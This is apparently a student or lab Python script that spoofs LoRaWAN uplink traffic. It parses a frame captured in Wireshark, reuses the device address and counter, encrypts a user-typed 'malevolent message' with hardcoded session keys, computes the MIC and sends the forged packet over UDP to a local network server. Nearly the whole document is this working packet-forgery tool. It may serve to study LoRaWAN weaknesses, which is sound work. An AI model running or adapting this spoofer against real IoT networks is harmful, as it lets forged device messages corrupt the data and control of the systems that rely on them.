import socket
from Crypto.Hash import CMAC
from Crypto.Cipher import AES

def uncofirmed_uplink(AppSKey, NwkSKey, DevAddr, FCnt, msg):
    MHDR = b'\x40'
    FCtrl = b'\x00'
    FCnt += 1
    FOpts = None
    FHDR = DevAddr + FCtrl + FCnt.to_bytes(2, 'little')  # + FOpts
    FPort = b'\x01'  # App Default
    direction = 0

    FRMPayload = encrypt_FRMPayload(AppSKey, DevAddr, FCnt, direction, msg)
    MACPayload = FHDR + FPort + FRMPayload

    B0 = generate_block0(direction, DevAddr, FCnt, MACPayload)
    input_block = B0 + MHDR + MACPayload
    MIC = generate_MIC(NwkSKey, input_block)

    to_transmit_pkt = MHDR + MACPayload + MIC

    sock.sendto(to_transmit_pkt, ("127.0.0.1", 9000))

    return FCnt


def encrypt_FRMPayload(AppSKey, DevAddr, FCnt, direction, plaintext):
    text_in_bytes = plaintext.encode()

    #print("CHIAVE ", AppSKey)
    #print("TESTO IN BYTES ", text_in_bytes)

    aes = AES.new(AppSKey, AES.MODE_ECB)
    block_size = 16
    n_blocks = (len(text_in_bytes) + block_size - 1) // block_size
    encrypted = b''

    for i in range(1, n_blocks + 1):
        Ai = (
            b'\x01' +                      # Byte 0: sempre 0x01 (indica CTR-like mode)
            b'\x00\x00\x00\x00' +          # Byte 1-4: sempre 0 (padding)
            bytes([direction & 0xFF]) +    # Byte 5: uplink = 0, downlink = 1
            DevAddr[::-1] +                # Byte 6-9: DevAddr in little endian
            FCnt.to_bytes(4, 'little') +   # Byte 10-13: FCnt (contatore) in LE
            b'\x00' +                      # Byte 14: padding
            bytes([i])                     # Byte 15: numero del blocco
        )

        Si = aes.encrypt(Ai)
        block = text_in_bytes[(i - 1)*block_size: i*block_size]
        encrypted += bytes(a ^ b for a, b in zip(block, Si))

    #print("TESTO CRIPTATO", encrypted)

    return encrypted

def generate_block0(direction, DevAddr, FCnt, MACPayload):
    B0 = (
            b'\x49' +  # 0: tipo MIC
            b'\x00\x00\x00\x00' +  # 1–4: padding
            bytes([direction & 0xFF]) +  # 5: 0 uplink, 1 downlink
            DevAddr[::-1] +  # 6–9: DevAddr LE
            FCnt.to_bytes(4, 'little') +  # 10–13: FCnt
            b'\x00' +  # 14: padding
            bytes([len(MACPayload)])  # 15: lunghezza messaggio
    )

    return B0


def generate_MIC(AESKey, payload):
    cmac_obj = CMAC.new(AESKey, ciphermod=AES)
    cmac_obj.update(payload)
    MIC = cmac_obj.digest()[:4]  # Nel contesto LoRaWAN, il MIC è di 4 byte, quindi lo standard specifica di usare solo i primi 4 byte dei 16 generati dall'AES-CMAC
    return MIC


def decrypt_FRMPayload(AppSKey, DevAddr, FCnt, direction, ciphertext):

    aes = AES.new(AppSKey, AES.MODE_ECB)
    block_size = 16
    n_blocks = (len(ciphertext) + block_size - 1) // block_size
    decrypted = b''

    for i in range(1, n_blocks + 1):
        Ai = (
                b'\x01' +
                b'\x00\x00\x00\x00' +
                bytes([direction & 0xFF]) +
                DevAddr[::-1] +
                FCnt.to_bytes(4, 'little') +
                b'\x00' +
                bytes([i])
        )

        Si = aes.encrypt(Ai)
        block = ciphertext[(i - 1) * block_size: i * block_size]
        decrypted += bytes(a ^ b for a, b in zip(block, Si))

    return decrypted

###################################################################################

AppSKey = bytes.fromhex('62EF6DC0FA4FF9A0B73E358E9EF7A5C3')
NwkSKey = bytes.fromhex('F3B76E521A84C90D7729EC014D8A3BF1') #NetSKey e AppSKey non corrispondenti

while True:
    # Inserisci l'FRMPayload estrapolato da Wireshark (senza spazi)
    hex_str = input("Insert FRMPayload from Wireshark: ")

    # Converte la stringa esadecimale in bytes
    data = bytes.fromhex(hex_str)

    # Visualizza i byte in formato lista
    print(f"[SPOOFER] Intercepted packet: {list(data)}")

    MHDR = data[0]
    DevAddr = data[1:5]    #spoofing del DevAddr
    FOptsLen = data[5] & 0x0F  # estrazione della lunghezza FOpts dai 4 bit bassi di FCtrl
    FRMPayload_start = 8 + FOptsLen  # FPort è subito dopo FHDR
    FRMPayload = data[FRMPayload_start + 1:-4]

    FCnt = data[6:8]
    FCnt = int.from_bytes(FCnt, 'little')

    #creazione del pacchetto malevolo
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    mal_msg = input("Insert malevolent message:")
    Fcnt = uncofirmed_uplink(AppSKey, NwkSKey, DevAddr, FCnt, mal_msg)
    print("[SPOOFER] Sending malevolent packet to NS")
    print("-------------------------------------------------")
